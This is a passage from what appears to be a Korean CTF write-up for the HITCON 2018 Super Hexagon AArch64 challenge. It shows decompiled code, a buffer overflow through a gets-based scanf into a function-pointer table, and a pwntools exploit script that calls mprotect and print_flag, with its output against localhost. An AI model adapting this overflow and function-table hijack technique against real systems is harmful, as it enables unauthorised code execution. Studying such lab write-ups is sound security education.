</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (tci_buf<span style="color:#f92672">-&gt;</span>cmd <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    uVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>( true ) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (tci_buf<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">&lt;=</span> uVar2) <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>      bVar1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(byte <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)<span style="color:#f92672">&amp;</span>tci_buf[<span style="color:#ae81ff">1</span>].cmd <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)(<span style="color:#66d9ef">int</span>)uVar2);
</span></span><span style="display:flex;"><span>      buf[(<span style="color:#66d9ef">int</span>)(uVar2 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">1</span>)] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0123456789abcdef&#34;</span>[(<span style="color:#66d9ef">int</span>)(uint)(bVar1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span>)];
</span></span><span style="display:flex;"><span>      buf[(<span style="color:#66d9ef">long</span>)(<span style="color:#66d9ef">int</span>)(uVar2 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0123456789abcdef&#34;</span>[(<span style="color:#66d9ef">int</span>)(bVar1 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xf</span>)];
</span></span><span style="display:flex;"><span>      uVar2 <span style="color:#f92672">=</span> uVar2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    buf[tci_buf<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>    iVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;load_key: failed (tci_msg: %s)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,tci_buf <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    iVar3 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> iVar3;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">cmd_save</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf,<span style="color:#66d9ef">int</span> idx,<span style="color:#66d9ef">int</span> len)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">save_key</span>(idx,buf,len);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[%d] &lt;= %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,(ulong)(uint)idx,buf);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">save_key</span>(<span style="color:#66d9ef">int</span> x,<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buf,<span style="color:#66d9ef">int</span> len)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  uint uVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar3;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iter;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> size;
</span></span><span style="display:flex;"><span>  TCI <span style="color:#f92672">*</span>pTVar2;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> len <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>  tci_buf<span style="color:#f92672">-&gt;</span>cmd <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
</span></span><span style="display:flex;"><span>  tci_buf<span style="color:#f92672">-&gt;</span>index <span style="color:#f92672">=</span> x;
</span></span><span style="display:flex;"><span>  pTVar2 <span style="color:#f92672">=</span> tci_buf;
</span></span><span style="display:flex;"><span>  tci_buf<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">=</span> uVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (iter <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; iter <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">int</span>)uVar1; iter <span style="color:#f92672">=</span> iter <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    iVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">h2i</span>(buf[iter <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>    iVar3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">h2i</span>(buf[(<span style="color:#66d9ef">long</span>)(iter <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>    pTVar2<span style="color:#f92672">-&gt;</span>data[iter] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span>)iVar2 <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> (<span style="color:#66d9ef">char</span>)iVar3;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  pTVar2<span style="color:#f92672">-&gt;</span>data[(<span style="color:#66d9ef">int</span>)uVar1] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">tc_tci_call</span>(tci_handle);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (tci_buf<span style="color:#f92672">-&gt;</span>cmd <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    iter <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;save_key: failed (tci_msg: %s)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,tci_buf<span style="color:#f92672">-&gt;</span>data);
</span></span><span style="display:flex;"><span>    iter <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> iter;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>tci_buf→cmd와 index를 설정하고 tci_handle을 인자로 tc_tci_call을 호출한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*</span>                           FUNCTION                          
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             undefined  <span style="color:#a6e22e">tc_tci_call</span> ()
</span></span><span style="display:flex;"><span>             undefined         w0:<span style="color:#ae81ff">1</span>           <span style="color:#f92672">&lt;</span>RETURN<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>                             tc_tci_call                                     XREF[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">:</span>     Entry <span style="color:#a6e22e">Point</span> (<span style="color:#f92672">*</span>) , 
</span></span><span style="display:flex;"><span>                                                                                          load_key:<span style="color:#ae81ff">00400324</span> (c) , 
</span></span><span style="display:flex;"><span>                                                                                          save_key:<span style="color:#ae81ff">004004</span><span style="color:#ae81ff">90</span> (c)   
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00401</span>b94 c8  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">80</span>  d2    mov        x8,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x6</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00401</span>b98 <span style="color:#ae81ff">08</span>  e0  bf  f2    movk       x8,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0xff00</span> , LSL <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00401</span>b9c <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  d4    svc        <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00401</span>ba0 c0  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">5f</span>  d6    ret
</span></span></code></pre></div><p>tci call도 생소한 번호의 시스템 콜을 호출한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">run</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> sVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> idx;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> cmd;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;cmd&gt; &#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>,<span style="color:#f92672">&amp;</span>cmd);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;index: &#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (cmd <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;key: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%s&#34;</span>,buf);
</span></span><span style="display:flex;"><span>    sVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(buf);
</span></span><span style="display:flex;"><span>    iVar2 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>)sVar1;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    iVar2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  (<span style="color:#f92672">*</span>cmdtb[cmd])(buf,idx,iVar2);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>취약점 자체는 간단하다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">scanf</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>__format,...)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
</span></span><span style="display:flex;"><span>  undefined8 in_x1;
</span></span><span style="display:flex;"><span>  undefined8 in_x2;
</span></span><span style="display:flex;"><span>  undefined8 in_x3;
</span></span><span style="display:flex;"><span>  undefined8 in_x4;
</span></span><span style="display:flex;"><span>  undefined8 in_x5;
</span></span><span style="display:flex;"><span>  undefined8 in_x6;
</span></span><span style="display:flex;"><span>  undefined8 in_x7;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>local_100;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>pvStack_f8;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>local_f0;
</span></span><span style="display:flex;"><span>  undefined8 uStack_e8;
</span></span><span style="display:flex;"><span>  __va_list ap;
</span></span><span style="display:flex;"><span>  undefined auStack_40 [<span style="color:#ae81ff">8</span>];
</span></span><span style="display:flex;"><span>  undefined8 local_38;
</span></span><span style="display:flex;"><span>  undefined8 local_30;
</span></span><span style="display:flex;"><span>  undefined8 local_28;
</span></span><span style="display:flex;"><span>  undefined8 local_20;
</span></span><span style="display:flex;"><span>  undefined8 local_18;
</span></span><span style="display:flex;"><span>  undefined8 local_10;
</span></span><span style="display:flex;"><span>  undefined8 local_8;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  ap.__vr_top <span style="color:#f92672">=</span> auStack_40;
</span></span><span style="display:flex;"><span>  ap.__gr_offs <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x38</span>;
</span></span><span style="display:flex;"><span>  ap.__vr_offs <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x80</span>;
</span></span><span style="display:flex;"><span>  ap.__stack <span style="color:#f92672">=</span> register0x00000008;
</span></span><span style="display:flex;"><span>  ap.__gr_top <span style="color:#f92672">=</span> register0x00000008;
</span></span><span style="display:flex;"><span>  local_38 <span style="color:#f92672">=</span> in_x1;
</span></span><span style="display:flex;"><span>  local_30 <span style="color:#f92672">=</span> in_x2;
</span></span><span style="display:flex;"><span>  local_28 <span style="color:#f92672">=</span> in_x3;
</span></span><span style="display:flex;"><span>  local_20 <span style="color:#f92672">=</span> in_x4;
</span></span><span style="display:flex;"><span>  local_18 <span style="color:#f92672">=</span> in_x5;
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> in_x6;
</span></span><span style="display:flex;"><span>  local_8 <span style="color:#f92672">=</span> in_x7;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gets</span>(input);
</span></span><span style="display:flex;"><span>  local_100 <span style="color:#f92672">=</span> ap.__stack;
</span></span><span style="display:flex;"><span>  pvStack_f8 <span style="color:#f92672">=</span> ap.__gr_top;
</span></span><span style="display:flex;"><span>  uStack_e8 <span style="color:#f92672">=</span> <span style="color:#a6e22e">CONCAT44</span>(ap.__vr_offs,ap.__gr_offs);
</span></span><span style="display:flex;"><span>  local_f0 <span style="color:#f92672">=</span> ap.__vr_top;
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">vsscanf</span>(input,__format,<span style="color:#f92672">&amp;</span>local_100);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> iVar1;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>scanf 내부의 cmdtb보다 0x100 바이트 앞에 위치한 input에 대한 bof가 발생한다.
그리고 cmdtb에 대한 oob access가 발생한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#f92672">-----------------------------------------------</span> Total <span style="color:#f92672">-----------------------------------------------</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] PT <span style="color:#a6e22e">Entry</span> (Total)<span style="color:#f92672">:</span> <span style="color:#ae81ff">9</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] PT <span style="color:#a6e22e">Entry</span> (merged consecutive pages)<span style="color:#f92672">:</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">--------------------------------------------</span> Memory map <span style="color:#f92672">--------------------------------------------</span>
</span></span><span style="display:flex;"><span>Virtual address start<span style="color:#f92672">-</span>end              Physical address start<span style="color:#f92672">-</span>end             Total size   Page size   Count  Flags
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x0000000000403000</span>  <span style="color:#ae81ff">0x000000000002c000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x000000000002f000</span>  <span style="color:#ae81ff">0x3000</span>       <span style="color:#ae81ff">0x1000</span>      <span style="color:#ae81ff">3</span>      [EL0<span style="color:#f92672">/</span>R<span style="color:#f92672">-</span>X EL1<span style="color:#f92672">/</span>R<span style="color:#f92672">--</span> ACCESSED GLOBAL]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000412000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x0000000000413000</span>  <span style="color:#ae81ff">0x000000000002f000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x0000000000030000</span>  <span style="color:#ae81ff">0x1000</span>       <span style="color:#ae81ff">0x1000</span>      <span style="color:#ae81ff">1</span>      [EL0<span style="color:#f92672">/</span>RW<span style="color:#f92672">-</span> EL1<span style="color:#f92672">/</span>RW<span style="color:#f92672">-</span> ACCESSED GLOBAL]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00007ffeffffd000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x00007ffeffffe000</span>  <span style="color:#ae81ff">0x0000000000034000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x0000000000035000</span>  <span style="color:#ae81ff">0x1000</span>       <span style="color:#ae81ff">0x1000</span>      <span style="color:#ae81ff">1</span>      [EL0<span style="color:#f92672">/</span>RW<span style="color:#f92672">-</span> EL1<span style="color:#f92672">/</span>RW<span style="color:#f92672">-</span> ACCESSED GLOBAL]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00007ffeffffe000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x00007ffefffff000</span>  <span style="color:#ae81ff">0x0000000000033000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x0000000000034000</span>  <span style="color:#ae81ff">0x1000</span>       <span style="color:#ae81ff">0x1000</span>      <span style="color:#ae81ff">1</span>      [EL0<span style="color:#f92672">/</span>RW<span style="color:#f92672">-</span> EL1<span style="color:#f92672">/</span>RW<span style="color:#f92672">-</span> ACCESSED GLOBAL]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00007ffefffff000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x00007fff00000000</span>  <span style="color:#ae81ff">0x0000000000032000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x0000000000033000</span>  <span style="color:#ae81ff">0x1000</span>       <span style="color:#ae81ff">0x1000</span>      <span style="color:#ae81ff">1</span>      [EL0<span style="color:#f92672">/</span>RW<span style="color:#f92672">-</span> EL1<span style="color:#f92672">/</span>RW<span style="color:#f92672">-</span> ACCESSED GLOBAL]
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00007fff7fffe000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x00007fff80000000</span>  <span style="color:#ae81ff">0x0000000000030000</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x0000000000032000</span>  <span style="color:#ae81ff">0x2000</span>       <span style="color:#ae81ff">0x1000</span>      <span style="color:#ae81ff">2</span>      [EL0<span style="color:#f92672">/</span>RW<span style="color:#f92672">-</span> EL1<span style="color:#f92672">/</span>RW<span style="color:#f92672">-</span> ACCESSED GLOBAL]
</span></span><span style="display:flex;"><span><span style="color:#f92672">--------------------------------------------</span> <span style="color:#960050;background-color:#1e0010">$</span>TTBR1_EL1 <span style="color:#f92672">--------------------------------------------</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] <span style="color:#960050;background-color:#1e0010">$</span>TTBR1_EL1: <span style="color:#ae81ff">0x1b000</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] <span style="color:#960050;background-color:#1e0010">$</span>TCR_EL1: <span style="color:#ae81ff">0x6080100010</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Intermediate Physical Address Size: <span style="color:#ae81ff">32</span> bits
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] EL1 Kernel Region: <span style="color:#ae81ff">0xffff000000000000</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xffffffffffffffff</span> (<span style="color:#ae81ff">48</span> bits)
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] EL1 Kernel Page Size: <span style="color:#ae81ff">4</span>KB (per page)
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] granule_bits: <span style="color:#ae81ff">12</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] LEVELM1_BIT_RANGE: None
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] LEVEL0_BIT_RANGE: [<span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">48</span>]
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] LEVEL1_BIT_RANGE: [<span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">39</span>]
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] LEVEL2_BIT_RANGE: [<span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">30</span>]
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] LEVEL3_BIT_RANGE: [<span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">21</span>]
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] OFFSET_BIT_RANGE: [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">12</span>]
</span></span><span style="display:flex;"><span><span style="color:#f92672">---------------------------------------------</span> LEVEL <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">---------------------------------------------</span>
</span></span></code></pre></div><p>ELF 바이너리 자체는 메모리에 그대로 올라가있다.
print_flag 함수가 이미 있어서 flag 얻는것 자체는 간단하다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/37528417332e26dd3ddb4d2f1a74a10b.png" alt=""  />
</p>
<h2 id="exploit-code-flag">Exploit code (flag)<a hidden class="anchor" aria-hidden="true" href="#exploit-code-flag">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>sla <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendlineafter(x,y)
</span></span><span style="display:flex;"><span>sa <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendafter(x,y)
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./super_hexagon/share/_bios.bin.extracted/BC010&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;localhost&#39;</span>,<span style="color:#ae81ff">6666</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0b101</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0xf8</span><span style="color:#f92672">-</span>len(payload))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>mprotect)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>buf) 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>print_flag) <span style="color:#75715e"># cmd = 1</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xdeadbeef</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> payload <span style="color:#f92672">and</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x0a</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> payload
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, str(<span style="color:#ae81ff">0</span>)) <span style="color:#75715e"># sz</span>
</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;key: &#39;</span>, payload)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>EL1도 exploit 하려면 안정적으로 쉘코드를 실행시킬 수 있어야한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>(<span style="color:#f92672">*</span>cmdtb[cmd])(buf,idx,len);
</span></span></code></pre></div><p>len, idx가 컨트롤 가능하기 때문에 mprotect를 호출해서 권한을 변경할 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#f92672">&gt;</span> python3 ex.py
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Opening connection to localhost on port <span style="color:#ae81ff">6666</span><span style="color:#f92672">:</span> Done
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">/</span>mnt<span style="color:#f92672">/</span>c<span style="color:#f92672">/</span>Users<span style="color:#f92672">/</span>msh<span style="color:#f92672">/</span>Desktop<span style="color:#f92672">/</span>SuperHexagon<span style="color:#f92672">/</span>super_hexagon<span style="color:#f92672">-</span><span style="color:#ae81ff">2044407</span>c141e2a3a49d9fb57b62c73ee<span style="color:#f92672">/</span>release<span style="color:#f92672">/</span>super_hexagon<span style="color:#f92672">/</span>share<span style="color:#f92672">/</span>_bios.bin.extracted<span style="color:#f92672">/</span>BC010<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:     aarch64<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>little
</span></span><span style="display:flex;"><span>    RELRO:    No RELRO
</span></span><span style="display:flex;"><span>    Stack:    No canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      No <span style="color:#a6e22e">PIE</span> (<span style="color:#ae81ff">0x400000</span>)
